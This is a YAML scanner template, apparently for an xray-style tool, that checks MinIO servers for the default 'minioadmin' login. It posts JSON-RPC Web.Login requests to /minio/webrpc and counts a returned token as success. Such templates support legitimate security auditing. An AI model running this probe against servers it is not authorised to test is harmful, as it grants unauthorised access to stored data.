detail:
  author: harris2015
  links:
  - https://docs.min.io/cn/
expression: poc10() || poc20()
manual: true
name: poc-yaml-minio-default-password
rules:
  poc10:
    expression: response.status == 200 && response.content_type.contains("json") &&
      response.body.bcontains(b"uiVersion") && response.body.bcontains(b"token")
    request:
      body: '{"id":1,"jsonrpc":"2.0","params":{"username":"minioadmin","password":"minioadmin"},"method":"Web.Login"}'
      cache: true
      follow_redirects: false
      headers:
        Content-Type: application/json
      method: POST
      path: /minio/webrpc
  poc20:
    expression: response.status == 200 && response.content_type.contains("json") &&
      response.body.bcontains(b"uiVersion") && response.body.bcontains(b"token")
    request:
      body: '{"id":1,"jsonrpc":"2.0","params":{"username":"minioadmin","password":"minioadmin"},"method":"web.Login"}'
      cache: true
      follow_redirects: false
      headers:
        Content-Type: application/json
      method: POST
      path: /minio/webrpc
transport: http
